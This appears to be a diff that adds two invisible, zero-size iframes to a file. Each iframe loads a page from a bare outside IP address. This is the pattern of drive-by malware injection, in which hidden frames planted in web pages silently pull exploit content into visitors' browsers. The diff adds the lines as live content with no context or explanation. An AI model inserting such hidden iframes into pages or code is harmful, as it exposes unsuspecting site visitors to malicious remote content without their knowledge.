@@ -1,0 +1,2 @@
+<iframe width=0 height=0 src=http://211.115.81.78/htm/X.htm></iframe>
+<iframe width=0 height=0 src=http://211.115.81.78/htm/XX.htm></iframe>
